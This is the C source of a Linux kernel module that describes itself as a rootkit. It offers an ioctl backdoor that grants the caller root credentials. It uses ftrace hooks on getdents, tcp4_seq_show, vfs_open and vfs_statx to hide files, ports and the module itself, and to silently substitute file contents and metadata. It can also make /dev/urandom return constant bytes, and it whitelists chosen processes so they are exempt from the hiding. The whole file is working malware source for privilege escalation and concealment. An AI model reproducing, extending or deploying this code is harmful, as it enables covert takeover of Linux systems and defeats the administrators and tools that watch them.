#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/workqueue.h>
#include <linux/miscdevice.h>
#include <linux/list.h>
#include <linux/rhashtable.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/dirent.h>
#include <crypto/chacha.h>
#include <linux/tcp.h>
#include <linux/fs.h>
#include <linux/mman.h>
#include <linux/namei.h>
#include <linux/path.h>
#include "bdoor.h"
#include "bdoor_common.h"
#ifdef CONFIG_X86_64
#include "hidden_entry.h"
#include "whitelist.h"
#include "net_hider.h"
#include "file_replace.h"
#endif
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ethan, Cyrus, and Nick");
MODULE_DESCRIPTION("rootkit kernel module");
MODULE_VERSION("1.0");

#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))

//FUNCTIONS WE NEED TO STEAL FROM THE KERNEL
void (*our_iterate_supers)(void (*)(struct super_block *, void *), void *);
void (*our_show_regs)(struct pt_regs *regs);
unsigned long (*our_ksys_mmap_pgoff)(unsigned long addr, unsigned long len,
				unsigned long prot, unsigned long flags,
				unsigned long fd, unsigned long pgoff);
static void steal_functions(void)
{
	our_iterate_supers = GET_FUNC_ADDR("iterate_supers",(void (*)(struct super_block *, void *), void *),void);
	our_show_regs = GET_FUNC_ADDR("show_regs",(struct pt_regs *regs),void);
	our_ksys_mmap_pgoff = GET_FUNC_ADDR("ksys_mmap_pgoff",(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long pgoff),unsigned long);
}

static bool creds_were_saved = false;
static struct cred old_creds;

static void save_old_creds(struct cred *cur_creds)
{
	old_creds.uid.val = cur_creds->uid.val;
	old_creds.gid.val = cur_creds->gid.val;
	old_creds.euid.val = cur_creds->euid.val;
	old_creds.egid.val = cur_creds->egid.val;
	old_creds.suid.val = cur_creds->suid.val;
	old_creds.sgid.val = cur_creds->sgid.val;
	old_creds.fsuid.val = cur_creds->fsuid.val;
	old_creds.fsgid.val = cur_creds->fsgid.val;
	creds_were_saved = true;
}

static long root_ioctl(struct file *file, unsigned long arg)
{
	struct cred *root;
	root = prepare_creds();

	//dunno which type of error to return if this fails, but this one seems good
	if (root == NULL)
		return -EAGAIN;

	if (root->uid.val == 0) {
		abort_creds(root);
		goto out;
	}
	save_old_creds(root);

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
	//printk(KERN_INFO "new_uid:%d\n",({current_uid();}).val);
out:
	return 0;
}

static long unroot_ioctl(struct file *file, unsigned long arg)
{
	struct cred *orig;

	if (!creds_were_saved) {
		printk(KERN_INFO "ROOTKIT: YOU HAVEN'T ROOTED YOURSELF YET\n");
		goto out;
	}

	orig = prepare_creds();

	//dunno which type of error to return if this fails, but this one seems good
	if (orig == NULL)
		return -EAGAIN;

	orig->uid.val = old_creds.uid.val;
	orig->gid.val = old_creds.gid.val;
	orig->euid.val = old_creds.euid.val;
	orig->egid.val = old_creds.egid.val;
	orig->suid.val = old_creds.suid.val;
	orig->sgid.val = old_creds.sgid.val;
	orig->fsuid.val = old_creds.fsuid.val;
	orig->fsgid.val = old_creds.fsgid.val;

	commit_creds(orig);
out:
	return 0;
}

static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file,char __user *buf,size_t nbytes, loff_t *ppos);


static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
	int i;
	ssize_t bytes_read;
	long error;
	char *kbuf = NULL;

	bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
#ifdef CONFIG_X86_64
	if (check_whitelist())
		goto out;
#endif
	kbuf = kzalloc(bytes_read, GFP_KERNEL);
	error = copy_from_user(kbuf, buf, bytes_read);

	if (error) {
		kfree(kbuf);
		goto out;
	}
	for (i = 0; i < bytes_read; i++)
		kbuf[i] = 0x20;
	error = copy_to_user(buf, kbuf, bytes_read);
	if(error)
		printk("ROOTKIT: %ld bytes could not be copied back into buf\n", error);
	kfree(kbuf);
out:
	return bytes_read;
}

static struct ftrace_hook urand_hook = HOOK("urandom_read",hook_urandom_read,&orig_urandom_read);
static bool urand_overridden = false;

static long urand_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	long err = 0;
	if (urand_overridden) {
		//printk("ROOTKIT: restoring urandom\n");
		fh_remove_hook(&urand_hook);
		urand_overridden = false;
	} else {
		//printk("ROOTKIT: overriding urandom\n");
		err = (long)fh_install_hook(&urand_hook);
		if (err) {
			printk("ROOTKIT: failed to override urandom\n");
			goto out;
		}
		urand_overridden = true;
	}
out:
	return err;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long hide_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	int ret = 0;
	struct hide_request request;
	if (copy_from_user(&request, (struct hide_request*) arg,
				sizeof(struct hide_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_hide_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}


static long show_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	int ret = 0;
	struct hide_request request;
	if (copy_from_user(&request, (struct hide_request*) arg,
				sizeof(struct hide_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_show_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long list_hidden_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long inject_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static long replace_ioctl(struct file *file, unsigned long arg)
{
	return 0;
}

static bool mod_is_hidden;
static struct list_head *prev_module;

static void hideme(void)
{
	mod_is_hidden = true;
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}


static long hide_mod_ioctl(struct file *file, unsigned long arg)
{
	long ret = 0;
	if (mod_is_hidden)
		goto out;
	hideme();
out:
	return ret;
}

static void showme(void)
{
	mod_is_hidden = false;
	list_add(&THIS_MODULE->list, prev_module);
}


static long show_mod_ioctl(struct file *file, unsigned long arg)
{
	long ret = 0;
	if (!mod_is_hidden)
		goto out;
showme();
out:
	return ret;
}

static long whit_add_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	long ret = 0;
	struct white_request request;
	if (copy_from_user(&request, (struct white_request*) arg,
				sizeof(struct white_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_wadd_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long whit_rem_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	long ret = 0;
	struct white_request request;
	if (copy_from_user(&request, (struct white_request*) arg,
				sizeof(struct white_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_wrem_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long whit_show_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	//long ret = 0;
	return 0;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long change_comm_ioctl(struct file *file, unsigned long arg)
{
	long ret = 0;
	struct comm_name newname;

	if (copy_from_user(&newname, (struct comm_name*) arg,
				sizeof(struct comm_name))) {
		ret = -EFAULT;
		goto out;
	}
	memcpy(current->comm,newname.name,MIN(strlen(newname.name),TASK_COMM_LEN));
out:
	return ret;
}

static long hide_port_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	long ret = 0;
	struct sock_request request;
	if (copy_from_user(&request, (struct sock_request*) arg,
				sizeof(struct sock_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_sockadd_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long show_port_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
	long ret = 0;
	struct sock_request request;
	if (copy_from_user(&request, (struct sock_request*) arg,
				sizeof(struct sock_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_sockrem_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long rep_file_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
        int ret = 0;
	struct replace_request request;
	if (copy_from_user(&request, (struct replace_request*) arg,
				sizeof(struct replace_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_replace_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long unrep_file_ioctl(struct file *file, unsigned long arg)
{
#ifdef CONFIG_X86_64
        int ret = 0;
	struct replace_request request;
	if (copy_from_user(&request, (struct replace_request*) arg,
				sizeof(struct replace_request))) {
		ret = -EFAULT;
		goto out;
	}
	process_unreplace_request(&request);
out:
	return ret;
#else
	return -ENOTSUP;
#endif //CONFIG_X86_64
}

static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	long ret;

	switch (cmd) {

	case ROOT_IOCTL:
		ret = root_ioctl(file,arg);
		break;

	case UNROOT_IOCTL:
		ret = unroot_ioctl(file,arg);
		break;

	case URAND_IOCTL:
		ret = urand_ioctl(file,arg);
		break;

	case HIDE_IOCTL:
		ret = hide_ioctl(file,arg);
                break;

	case SHOW_IOCTL:
		ret = show_ioctl(file,arg);
                break;

	case LIST_HIDDEN_IOCTL:
		ret = list_hidden_ioctl(file,arg);
		break;

	case INJECT_IOCTL:
		ret = inject_ioctl(file,arg);
                break;

	case REPLACE_IOCTL:
		ret = replace_ioctl(file,arg);
                break;

	case HIDE_MOD_IOCTL:
		ret = hide_mod_ioctl(file,arg);
		break;

	case SHOW_MOD_IOCTL:
		ret = show_mod_ioctl(file,arg);
		break;

	case WHIT_ADD_IOCTL:
		ret = whit_add_ioctl(file,arg);
		break;

	case WHIT_REM_IOCTL:
		ret = whit_rem_ioctl(file,arg);
		break;

	case WHIT_SHOW_IOCTL:
		ret = whit_show_ioctl(file,arg);
		break;

	case CHANGE_COMM_IOCTL:
		ret = change_comm_ioctl(file,arg);
		break;

	case HIDE_PORT_IOCTL:
		ret = hide_port_ioctl(file,arg);
		break;

	case SHOW_PORT_IOCTL:
		ret = show_port_ioctl(file,arg);
		break;

	case REP_FILE_IOCTL:
		ret = rep_file_ioctl(file,arg);
		break;

	case UNREP_FILE_IOCTL:
		ret = unrep_file_ioctl(file,arg);
		break;
	default:
		ret = -ENOTTY;
	}

	return ret;
}

static int rkit_open(struct inode *inode, struct file *file)
{
        return 0;
}
static int rkit_release(struct inode *inode, struct file *file)
{
        return 0;
}

static const struct file_operations rkit_fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = rkit_ioctl,
	.open = rkit_open,
	.release = rkit_release,
};

static struct miscdevice rkit_dev = {
        .minor = BDOOR_DEV_MINOR,
        .name = BDOOR_DEV_NAME,
        .fops = &rkit_fops,
	.mode = S_IRUSR | S_IWUSR | S_IROTH,
};

#ifdef CONFIG_X86_64

void assemble_dentry_identifier(struct dentry_identifier *id,
			ino_t ino,dev_t dev,
			char *name)
{
	memset(id,0,sizeof(struct dentry_identifier));
	id->parent_ino = ino;
	id->device = dev;
	id->name_len = MIN(strlen(name),255);
	strncpy(id->name,name,id->name_len);
}
#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	int fd = regs->di;
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

	long error;
	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
	struct dentry_identifier current_id;
	unsigned long offset = 0;

	struct fd orig_dir;
	ino_t dir_ino;
	dev_t orig_dev;
	unsigned long flags;

	int ret = orig_getdents64(regs);
	if (check_whitelist())
		goto out;

	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ((ret <= 0) || (dirent_ker == NULL) )
		goto out;

	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;
	orig_dir = fdget(fd);
	dir_ino = orig_dir.file->f_inode->i_ino;
	orig_dev = orig_dir.file->f_inode->i_sb->s_dev>>12;
	fdput(orig_dir);

	while (offset < ret) {
		current_dir =  (void *)dirent_ker + offset;
		assemble_dentry_identifier(&current_id,
				dir_ino,orig_dev,current_dir->d_name);
		spin_lock_irqsave(&hidden_table_lock,flags);
		atomic_inc(&hidden_table_users);
		if (rhashtable_lookup_fast(&hidden_table,&current_id,
						hidden_table_params)) {
			atomic_dec(&hidden_table_users);
			spin_unlock_irqrestore(&hidden_table_lock,flags);
			if (current_dir == dirent_ker) {
				ret -= current_dir->d_reclen;
				memmove(current_dir,
					(void *)current_dir +
					current_dir->d_reclen,
					ret);
				continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
		} else {
			atomic_dec(&hidden_table_users);
			spin_unlock_irqrestore(&hidden_table_lock,flags);
			previous_dir = current_dir;
		}
		offset += current_dir->d_reclen;
	}

	error = copy_to_user(dirent, dirent_ker, ret);
	if (error)
		goto done;
done:
	kfree(dirent_ker);
out:
	return ret;
}

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
	struct linux_dirent {
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen;
		char d_name[];
	};

	int fd = regs->di;
	struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
	//int count = regs->dx;

	long error;
	struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
	struct dentry_identifier current_id;
	unsigned long offset = 0;

	struct fd orig_dir;
        ino_t dir_ino;
        dev_t orig_dev;
        unsigned long flags;

	int ret = orig_getdents(regs);

	if (check_whitelist())
                goto out;

	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ((ret <= 0) || (dirent_ker == NULL))
		goto out;

	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;

	orig_dir = fdget(fd);
        dir_ino = orig_dir.file->f_inode->i_ino;
        orig_dev = orig_dir.file->f_inode->i_sb->s_dev >> 12;
	fdput(orig_dir);

	while (offset < ret) {
		current_dir = (void *)dirent_ker + offset;
		assemble_dentry_identifier(&current_id,
                                dir_ino,orig_dev,current_dir->d_name);
                spin_lock_irqsave(&hidden_table_lock,flags);
                atomic_inc(&hidden_table_users);
                if (rhashtable_lookup_fast(&hidden_table,&current_id,
                                                hidden_table_params)) {
                        atomic_dec(&hidden_table_users);
                        spin_unlock_irqrestore(&hidden_table_lock,flags);
			if (current_dir == dirent_ker) {
                                ret -= current_dir->d_reclen;
                                memmove(current_dir,
                                        (void *)current_dir +
                                        current_dir->d_reclen,
                                        ret);
                                continue;
                        }
                        previous_dir->d_reclen += current_dir->d_reclen;
                } else {
                        atomic_dec(&hidden_table_users);
                        spin_unlock_irqrestore(&hidden_table_lock,flags);
                        previous_dir = current_dir;
                }
                offset += current_dir->d_reclen;
        }

        error = copy_to_user(dirent, dirent_ker, ret);
        if (error)
                goto done;
done:
	kfree(dirent_ker);
out:
	return ret;
}

static int get_orig_dentry_id(char __user *filename,
			struct dentry_identifier *da_id)
{
	struct file *stupid_file;
	struct dentry *orig_dentry;
	ino_t parent_ino;
	dev_t dev;
	char fname[PATH_MAX+1];
	int err = 0;

	strncpy_from_user(fname,filename,PATH_MAX);

	stupid_file = filp_open(fname, O_PATH,0);
	if (IS_ERR(stupid_file)) {
		err = PTR_ERR(stupid_file);
		goto out_file_open_name_err;
	}
	orig_dentry = file_dentry(stupid_file);
	parent_ino = orig_dentry->d_parent->d_inode->i_ino;
	dev = orig_dentry->d_inode->i_sb->s_dev >> 12;
	assemble_dentry_identifier(da_id,parent_ino,dev,orig_dentry->d_name.name);
	fput(stupid_file);
out_file_open_name_err:
	return err;
}

static char __user *get_rep_path(struct dentry *rep_dentry)
{
	char *buf;
	char *rep_path;
	char __user *rep_path_usr;

	buf = kmalloc(PATH_MAX,GFP_KERNEL);
	rep_path = dentry_path_raw(rep_dentry,buf,PATH_MAX);
	rep_path_usr = (char*)(uintptr_t)our_ksys_mmap_pgoff(NULL,
					strlen(rep_path)+1,
					PROT_READ | PROT_WRITE,
					MAP_ANONYMOUS | MAP_SHARED,
					-1,0);
	copy_to_user(rep_path_usr,rep_path,strlen(rep_path));
	kfree(buf);
	return rep_path_usr;
}

static struct replace_entry *get_rep_entry(struct dentry_identifier *da_id)
{
	struct replace_entry *rep_entry;
	struct replace_entry *rep_entry_clone = NULL;
	unsigned long flags;
	atomic_inc(&replace_table_users);
	spin_lock_irqsave(&replace_table_lock,flags);

	rep_entry = rhashtable_lookup_fast(&replace_table,da_id,
					replace_table_params);
	if (rep_entry != NULL) {
		rep_entry_clone = kmalloc(sizeof(struct replace_entry),GFP_ATOMIC);
		memcpy(rep_entry_clone,rep_entry,sizeof(struct replace_entry));
	}
	spin_unlock_irqrestore(&replace_table_lock,flags);
	atomic_dec(&replace_table_users);
	return rep_entry_clone;
}

struct sb_query {
	dev_t device;
	struct super_block *sb;
};

static void find_super(struct super_block *sb, void *arg)
{
	struct sb_query *query = (struct sb_query*)arg;
	if (sb->s_dev >> 12 == query->device)
		query->sb = sb;
}

static struct dentry *get_rep_dentry(struct dentry_identifier *da_id)
{
	struct dentry *rep_dentry = NULL;
	struct dentry *par_dentry = NULL;
	struct replace_entry *rep_entry;
	struct super_block *rep_sup;
	struct inode *rep_inode = NULL;
	struct qstr rep_name;
	struct sb_query query;
	rep_entry = get_rep_entry(da_id);
	if (rep_entry != NULL) {
		query.device = rep_entry->rep.device;
		our_iterate_supers(find_super,&query);
		rep_sup = query.sb;
		rep_inode = ilookup(rep_sup,rep_entry->rep.parent_ino);
		rep_name = (struct qstr) QSTR_INIT(rep_entry->rep.name,
						strlen(rep_entry->rep.name));
		par_dentry = d_find_alias(rep_inode);
		rep_dentry = d_alloc(par_dentry,&rep_name);
		rep_inode->i_op->lookup(rep_inode,rep_dentry,0);
		dput(par_dentry);
		kfree(rep_entry);
		iput(rep_inode);
	}

	return rep_dentry;
}


static asmlinkage int (*orig_vfs_statx)(int dfd, const char __user *filename,
					int flags,struct kstat *stat,
					u32 request_mask);


static void path_get_dentry_id(const struct path *path,
			struct dentry_identifier *da_id)
{
	ino_t parent_ino = path->dentry->d_parent->d_inode->i_ino;
	dev_t dev = path->dentry->d_inode->i_sb->s_dev >> 12;
	char *name = path->dentry->d_name.name;
	assemble_dentry_identifier(da_id,parent_ino,dev,name);
}

static int statx_get_dentry_id(int dfd, const char __user *filename, int flags,
			struct dentry_identifier *da_id)
{
	struct path path;
        unsigned lookup_flags = 0;
        int error = 0;

        if (flags & ~(AT_SYMLINK_NOFOLLOW | AT_NO_AUTOMOUNT | AT_EMPTY_PATH |
                      AT_STATX_SYNC_TYPE))
                return -EINVAL;

        if (!(flags & AT_SYMLINK_NOFOLLOW))
                lookup_flags |= LOOKUP_FOLLOW;
        if (!(flags & AT_NO_AUTOMOUNT))
                lookup_flags |= LOOKUP_AUTOMOUNT;
        if (flags & AT_EMPTY_PATH)
                lookup_flags |= LOOKUP_EMPTY;

        error = user_path_at(dfd, filename, lookup_flags, &path);
	if (error)
		goto out;

	path_get_dentry_id(&path,da_id);
out:
	return error;
}

static void rep_vfs_statx(struct kstat *stat, struct dentry *rep_dentry,
			int dfd, int flags, u32 request_mask, int *ret)
{
	struct kstat rep_stat;
	char __user *rep_filename = NULL;
	rep_filename = get_rep_path(rep_dentry);

	if (!rep_filename)
		return;

	*ret = orig_vfs_statx(AT_FDCWD,rep_filename,flags,&rep_stat,request_mask);
	stat->size = rep_stat.size;
	stat->atime = rep_stat.atime;
	stat->mtime = rep_stat.mtime;
	stat->ctime = rep_stat.ctime;
	stat->btime = rep_stat.btime;
	stat->blocks = rep_stat.blocks;

	vm_munmap((unsigned long)rep_filename,strlen(rep_filename)+1);
}

static asmlinkage int hook_vfs_statx(int dfd, const char __user *filename,
					int flags,struct kstat *stat,
					u32 request_mask)
{
	struct dentry_identifier da_id;
	struct dentry *rep_dentry;
	struct path path;

	int err;
	int ret;

	ret = orig_vfs_statx(dfd,filename,flags,stat,request_mask);

	if (check_whitelist())
                goto out;

	err = statx_get_dentry_id(dfd,filename,flags,&da_id);

	if (err)
		goto out;

	rep_dentry = get_rep_dentry(&da_id);

	if (rep_dentry) {
		rep_vfs_statx(stat,rep_dentry,dfd,flags,request_mask,&ret);
		dput(rep_dentry);
	}
out:
	return ret;
}

static asmlinkage int (*orig_vfs_stat)(const char __user *filename, struct kstat *stat);

static void rep_vfs_stat(struct kstat *stat, struct dentry *rep_dentry, int *ret)
{
	struct kstat rep_stat;
	char __user *rep_filename = NULL;
	rep_filename = get_rep_path(rep_dentry);

	if (!rep_filename)
		return;

	*ret = orig_vfs_stat(rep_filename,&rep_stat);

	stat->size = rep_stat.size;
	stat->atime = rep_stat.atime;
	stat->mtime = rep_stat.mtime;
	stat->ctime = rep_stat.ctime;
	stat->btime = rep_stat.btime;
	stat->blocks = rep_stat.blocks;

	vm_munmap((unsigned long)rep_filename,strlen(rep_filename)+1);
}

static asmlinkage int hook_vfs_stat(const char __user *filename, struct kstat *stat)
{
	struct dentry_identifier da_id;
	struct dentry *rep_dentry;

	int err;
	int ret;

	ret = orig_vfs_stat(filename,stat);

	if (check_whitelist())
                goto out;

	err = get_orig_dentry_id(filename,&da_id);
	if (err)
		goto out;

	rep_dentry = get_rep_dentry(&da_id);

	if (rep_dentry) {
		rep_vfs_stat(stat,rep_dentry,&ret);
		dput(rep_dentry);
	}
out:
	return ret;
}

static asmlinkage int (*orig_vfs_open)(const struct path *path, struct file *file);

static char *get_rep_path_kern(struct dentry *rep_dentry)
{
	char *buf;
	char *rep_path;
	char *out_path;

	buf = kmalloc(PATH_MAX,GFP_KERNEL);
	rep_path = dentry_path_raw(rep_dentry,buf,PATH_MAX);
	out_path = kzalloc(strlen(rep_path)+1,GFP_KERNEL);
	memcpy(out_path,rep_path,strlen(rep_path));
	kfree(buf);
	return out_path;
}


static asmlinkage int hook_vfs_open(const struct path *path, struct file *file)
{
	struct path rep_path;
	struct dentry_identifier da_id;
	struct dentry *rep_dentry;
	char *rep_name;
	struct path *out_path = path;
	bool was_replaced = false;
	int out;

	if (check_whitelist())
                goto out_nohit;

	path_get_dentry_id(path,&da_id);

	rep_dentry = get_rep_dentry(&da_id);

	if (!rep_dentry)
		goto out_nohit;

	rep_name = get_rep_path_kern(rep_dentry);

	if (!kern_path(rep_name,0,&rep_path)) {
		out_path = &rep_path;
		was_replaced = true;
	}

	dput(rep_dentry);
	kfree(rep_name);
out_nohit:
	out = orig_vfs_open(out_path,file);
	if (was_replaced)
		path_put(&rep_path);
	return out;
}
#else

static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);

#endif //PTREGS_SYSCALL_STUBS


static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct inet_sock *is;

	if (check_whitelist())
                goto out;

	if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (check_socket_blacklist(is))
			return 0;
	}
out:
	return orig_tcp4_seq_show(seq, v);
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
	HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("vfs_open",hook_vfs_open,&orig_vfs_open),
	HOOK("vfs_statx",hook_vfs_statx,&orig_vfs_statx),
};

static void remove_all_hooks(void)
{
	if (urand_overridden) {
		//printk("ROOTKIT: restoring urandom\n");
		fh_remove_hook(&urand_hook);
		urand_overridden = false;
	}
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

#endif //CONFIG_X86_64




static void init_tables_and_locks(void)
{
	spin_lock_init(&hidden_table_lock);
        atomic_set(&hidden_table_users,0);
        rhashtable_init(&hidden_table,&hidden_table_params);

	spin_lock_init(&replace_table_lock);
	atomic_set(&replace_table_users,0);
	rhashtable_init(&replace_table, &replace_table_params);

	spin_lock_init(&procname_whitelist_lock);
        atomic_set(&procname_whitelist_users,0);
        rhashtable_init(&procname_whitelist,&procname_whitelist_params);

        spin_lock_init(&pid_whitelist_lock);
        atomic_set(&pid_whitelist_users,0);
        rhashtable_init(&pid_whitelist,&pid_whitelist_params);

        spin_lock_init(&uid_whitelist_lock);
        atomic_set(&uid_whitelist_users,0);
        rhashtable_init(&uid_whitelist,&uid_whitelist_params);

        spin_lock_init(&gid_whitelist_lock);
        atomic_set(&gid_whitelist_users,0);
        rhashtable_init(&gid_whitelist,&gid_whitelist_params);

	spin_lock_init(&socket_blacklist_lock);
	atomic_set(&socket_blacklist_users,0);
	rhashtable_init(&socket_blacklist,&socket_blacklist_params);
}

static void free_tables_and_locks(void)
{
	while(atomic_read(&hidden_table_users)){}
        rhashtable_free_and_destroy(&hidden_table,hidden_table_free_entry,NULL);

	while(atomic_read(&replace_table_users)){}
	rhashtable_free_and_destroy(&replace_table,replace_table_free_entry,NULL);

	while(atomic_read(&procname_whitelist_users)){}
        rhashtable_free_and_destroy(&procname_whitelist,procname_whitelist_free_entry,NULL);

	while(atomic_read(&pid_whitelist_users)){}
        rhashtable_free_and_destroy(&pid_whitelist,pid_whitelist_free_entry,NULL);

	while(atomic_read(&uid_whitelist_users)){}
        rhashtable_free_and_destroy(&uid_whitelist,uid_whitelist_free_entry,NULL);

	while(atomic_read(&gid_whitelist_users)){}
        rhashtable_free_and_destroy(&gid_whitelist,gid_whitelist_free_entry,NULL);

	while(atomic_read(&socket_blacklist_users)){}
	rhashtable_free_and_destroy(&socket_blacklist,socket_blacklist_free_entry,NULL);
}

static int __init rootkit_init(void)
{
	int error;
	printk(KERN_INFO "rootkit init\n");
#ifdef CONFIG_X86_64
	bdoor_init();
	steal_functions();
	init_tables_and_locks();

	hidden_file_viewer = proc_create(procfs_file_name,0000,NULL,&hidden_ops);
	if (!hidden_file_viewer) {
		error = -ENOMEM;
		goto hidden_proc_create_cleanup;
	}
	replaced_file_viewer = proc_create(procfs_replace_name,0000,NULL,&replace_ops);
	if (!replaced_file_viewer) {
		error = -ENOMEM;
		goto replace_proc_create_cleanup;
	}
	whitelist_viewer = proc_create(procfs_whitelist_name,0000,NULL,&whitelist_ops);
	if (!whitelist_viewer) {
		error = -ENOMEM;
		goto whitelist_proc_create_cleanup;
	}
	socket_blacklist_viewer = proc_create(procfs_socket_blacklist_name,0000,
					NULL,&socket_blacklist_ops);
	if (!socket_blacklist_viewer) {
		error = -ENOMEM;
		goto socket_proc_create_cleanup;
	}
	error = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
	if (error)
		goto install_hooks_cleanup;
#endif //CONFIG_X86_64
	error = misc_register(&rkit_dev);
	if (error)
                goto misc_register_cleanup;
	return 0;

misc_register_cleanup:
#ifdef CONFIG_X86_64
	remove_all_hooks();
install_hooks_cleanup:
	proc_remove(socket_blacklist_viewer);
socket_proc_create_cleanup:
	proc_remove(whitelist_viewer);
whitelist_proc_create_cleanup:
	proc_remove(replaced_file_viewer);
replace_proc_create_cleanup:
	proc_remove(hidden_file_viewer);
hidden_proc_create_cleanup:
	free_tables_and_locks();
#endif //CONFIG_X86_64
	return error;
}

static void __exit rootkit_exit(void)
{
	printk(KERN_INFO "rootkit exit\n");
#ifdef CONFIG_X86_64
	remove_all_hooks();
	free_tables_and_locks();
#endif //CONFIG_X86_64

	misc_deregister(&rkit_dev);
#ifdef CONFIG_X86_64
	proc_remove(replaced_file_viewer);
	proc_remove(socket_blacklist_viewer);
	proc_remove(hidden_file_viewer);
	proc_remove(whitelist_viewer);
#endif //CONFIG_X86_64
}

module_init(rootkit_init);
module_exit(rootkit_exit);
